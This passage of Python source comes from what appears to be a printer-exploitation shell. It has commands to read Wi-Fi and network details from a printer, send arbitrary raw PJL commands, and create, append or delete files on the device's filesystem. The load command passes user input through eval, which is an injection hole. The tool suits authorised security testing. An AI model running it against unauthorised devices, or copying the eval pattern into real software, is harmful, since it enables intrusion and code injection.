        print("\n=== Wi-Fi Information ===")
        vars = self.cmd("@PJL INFO VARIABLES").splitlines()
        keys = ["WIRELESS", "SSID", "AUTHENTICATION", "802.11", "802.", "CHANNEL", "IPV4", "GATEWAY", "DNS", "MAC", "DHCP", "WINS", "DIRECT", "DIRECT-PRINT", "DIRECTPRINT"]
        for line in vars:
            for k in keys:
                if k in line.upper():
                    print(line.strip())
        print("")

    def do_direct(self, *arg):
        """
        Show direct-print configuration: SSID, channel, IPv4.
        """
        print("\n=== Direct-Print Configuration ===")
        vars = self.cmd("@PJL INFO VARIABLES").splitlines()
        keys = ["IMPRESSION DIRETA", "CANAL", "ENDEREÇO IPV4", "DIRECT-PRINT", "DIRECTPRINT"]
        # Some printers label them in English, some in Portuguese:
        extras = ["DIRECT", "CHANNEL", "IPV4", "IP ADDRESS", "DIRECT-PRINT", "DIRECTPRINT"]
        for line in vars:
            L = line.upper()
            if any(k in L for k in keys + extras):
                print(line.strip())
        print("")

    # ------------------------[ site <command> ]--------------------------
    def do_site(self, arg):
        """
        Execute an arbitrary PJL command on the printer.

        Usage:
          site <PJL command>

        Examples:
          site @PJL INFO STATUS
          site @PJL SET QUIETMODE=ON
          site @PJL RDYMSG DISPLAY="Maintenance mode"
          site @PJL DMCMD ASCIIHEX="040006020501010301040104"

        This passes your argument verbatim to the printer (wrapped
        in the normal UEL/ECHO footer) and prints back the raw response.
        """
        if not arg:
            try:
                # prompt for multi-word commands
                arg = input("PJL command> ").strip()
            except (EOFError, KeyboardInterrupt):
                print()  # just exit silently on Ctrl-D / Ctrl-C
                return

        try:
            # send the raw PJL command and capture full raw reply
            resp = self.cmd(arg, wait=True, crop=False, binary=False)
            # dump it unmodified, so users can parse whatever they like
            if resp:
                print(resp.rstrip())
            else:
                output().message("(no response)")
        except Exception as e:
            output().errmsg("site command failed", e)

    def help_site(self):
        "Execute a raw PJL command on the device"
        print()
        output().header("site <PJL command>")
        output().message("site           Execute a raw PJL command on the device")
        print()
        output().red("Examples:")
        output().red("  site @PJL INFO STATUS")
        output().red("  site @PJL SET QUIETMODE=ON")
        output().red('  site @PJL RDYMSG DISPLAY="Hello, world!"')
        output().red('  site @PJL DMCMD ASCIIHEX="040006020501010301040104"')
        print()
        output().message("Note: your command is sent exactly as given, so you can use any PJL")
        output().message("      statements not otherwise wrapped by built-in commands.")
        print()
    
    # ------------------------[ load ]------------------------------------
    def do_load(self, arg):
        "Run commands from file:  load cmd.txt"
        if not arg:
            arg = eval(input("File: "))
        data = file().read(arg).decode() or ""
        for cmd_line in data.splitlines():
            print(self.prompt + cmd_line)
            self.onecmd(self.precmd(cmd_line))

    def help_load(self):
        "Run PJL commands from a script"
        print()
        output().header("load <file>")
        output().message("  Load and execute commands from the given file.")
        output().message("  Execute every line of the given local file as a PJL command.")
        print()

    # ------------------------[ touch <file> ]----------------------------
    def do_touch(self, arg):
        "Update remote file timestamp, or create it if missing: touch <file>"
        # 1) prompt if needed
        if not arg:
            arg = input("Remote file path: ").strip()
            if not arg:
                output().message("touch: no file specified.")
                return

        # 2) normalize path
        path = self.rpath(arg)

        try:
            # 3) does it exist?
            size = self.file_exists(path)
            if size == c.NONEXISTENT:
                # 4a) create zero‐byte file
                self.cmd(f'@PJL FSDOWNLOAD FORMAT:BINARY SIZE=0 NAME="{path}"', wait=False)
                output().info(f"Created remote file: {path}")
            else:
                # 4b) append zero bytes to bump timestamp
                self.cmd(f'@PJL FSAPPEND FORMAT:BINARY SIZE=0 NAME="{path}"', wait=False)
                output().info(f"Touched remote file: {path}")
        except Exception as e:
            # 5) report any error
            output().errmsg("touch error", e)

    def help_touch(self):
        "Update (or create) a remote file's timestamp"
        print()
        output().header("touch <remote_path>")
        output().message("  Append zero-length data to update the file's timestamp.")
        output().message("  If the file does not exist, it will be created.")
        print()

    # --------------------------------------------------------------------
    # SESSION PERMISSIONS TEST
    def do_permissions(self, arg):
        """
        Test your session’s file permissions on the remote device.
        Creates a tiny temp file, checks it, then deletes it.
        """
        output().message("\n=== Session Permissions ===")
        # generate a random 6-digit name
        rnd = random.randrange(0, 10**6)
        fname = f"{rnd:06d}.tmp"
        # build a full remote path in the current volume & cwd
        remote = self.vol + self.cwd + c.SEP + fname

        try:
            # try to write a zero-byte file
            self.cmd(f'@PJL FSDOWNLOAD FORMAT:BINARY SIZE=0 NAME="{remote}"', wait=True)
            # query its existence
            resp = self.cmd(f'@PJL FSQUERY NAME="{remote}"', wait=True, crop=False)
            if "TYPE=FILE" in resp:
                output().message("Write permission: YES")
                # cleanup
                self.cmd(f'@PJL FSDELETE NAME="{remote}"', wait=False)
                output().message("File deletion: OK")
            else:
                output().message("Write permission: NO")
        except Exception as e:
            output().errmsg("Permissions test error", e)

    def help_permissions(self):
        "Show current session FS permissions"
        print()
        output().header("permissions")
        output().message("  Test your session's file permissions on the remote device.")
        output().message("  Creates a tiny temp file, checks it, then deletes it.")
        output().message("  If the file is created and deleted successfully, you have write permission.")
        output().message("  If the file cannot be created or deleted, you may have read-only access.")
        output().message("  If the file exists but cannot be deleted, you may have read-only access.")
        output().message("  If the file cannot be created, you likely have no write permission.")
        print()
        output().red("  Note: This command is useful for diagnosing access issues.")
        output().red("      It checks if you can create, read, and delete files in the current directory.")
        print()
